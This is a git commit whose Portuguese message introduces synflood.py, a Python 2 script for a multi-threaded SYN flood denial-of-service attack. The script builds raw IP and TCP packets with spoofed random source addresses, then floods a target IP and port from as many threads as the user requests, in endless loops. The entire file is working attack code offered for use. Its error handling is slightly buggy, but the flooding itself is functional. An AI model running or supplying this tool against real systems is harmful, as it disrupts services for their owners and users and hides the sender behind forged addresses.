3260739e4129b4100dd4c60a434b0689ecaff277
Aurora Li Min <auroralimin@hotmail.com>
2017-06-26 01:02:54 -0300

    Commit inicial
    Inclui codigo-fonte para um ataque SYN Flood multi-thread nao
    distribuido. Para executar, informe porta de destino, IP de destino
    e o número de threads que serao usadas no ataque.

---
+++ synflood.py
@@ -0,0 +1,83 @@
+import sys
+import thread
+import socket
+import random
+import struct
+from struct import *
+
+if len(sys.argv) < 4:
+    print "Erro. Execute com python %s <porta> <ip> <No de threads>" % \
+          (sys.argv[0])
+
+def calcChecksum(header):
+    unpacked = struct.unpack('!'+'H'*(len(header)/2), header)
+    total = 0
+    for half in unpacked:
+        total+=half
+
+    checksum = (total & 0xffff) + (total>>16)
+    checksum = ~checksum & 0xffff
+    
+    return checksum
+
+def syn_flood(ID, portDest, ipDest):
+    while 1:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
+                              socket.IPPROTO_TCP)
+        except:
+            print "Erro: Nao foi possivel criar socket na thread %s" % (ID)
+            sys.exit()
+
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        ipSource = socket.inet_ntoa(struct.pack('>I',\
+                                                random.randint(1, 0xffffffff)))
+
+        versionIhlDscpEcn = 0x45000028
+        identification = random.randint(1, 0xffff)
+        flagsFragoffset = 0x00004006
+        srcIp = socket.inet_aton(ipSource)    
+        dstIp = socket.inet_aton(ipDest) 
+
+        ipv4Header = pack("!IHIH4s4s", versionIhlDscpEcn, identification,\
+                          flagsFragoffset, 0x0, srcIp, dstIp)
+        cs = calcChecksum(ipv4Header)
+        ipv4Header = pack("!IHIH4s4s", versionIhlDscpEcn, identification,\
+                          flagsFragoffset, cs, srcIp, dstIp)
+
+        srcPort = random.randint(1, 0xffff)
+        dstPort = int(portDest)
+        seqNum = 0x0
+        ackNum = random.randint(1, 0xffffffff)
+        offsetFlagsWsize = 0x50020200
+        uPointer = 0x0
+
+        tcpHeader = pack("!HHIIIHH", srcPort, dstPort, seqNum, ackNum,\
+                         offsetFlagsWsize, 0x0, uPointer)
+
+        zerosProtocol = (0x0 + socket.IPPROTO_TCP)
+        tcpLen = len(tcpHeader)
+        fakeHeader = pack("!4s4sII", srcIp, dstIp, zerosProtocol, tcpLen)
+        cs = calcChecksum(fakeHeader + tcpHeader)
+
+        tcpHeader = pack("!HHIIIHH", srcPort, dstPort, seqNum, ackNum,\
+                         offsetFlagsWsize, cs, uPointer)
+
+        # Prints para se quiser ver os headers sendo gerados
+        # print struct.unpack("!IHIHII", ipv4Header)
+        # print struct.unpack("!HHIIII", tcpHeader)
+        # print struct.unpack("!IIIIIIIIII", packet)
+        
+        packet = ipv4Header + tcpHeader;
+        s.sendto(packet, (ipDest, 0))
+
+for i in range(int(sys.argv[3])):
+    try:
+        thread.start_new_thread(syn_flood, (i, sys.argv[1], sys.argv[2],))
+    except:
+        print "Erro: Nao foi possivel iniciar a thread %s" % (str(e), i)
+        sys.exit()
+
+while 1:
+   pass
+
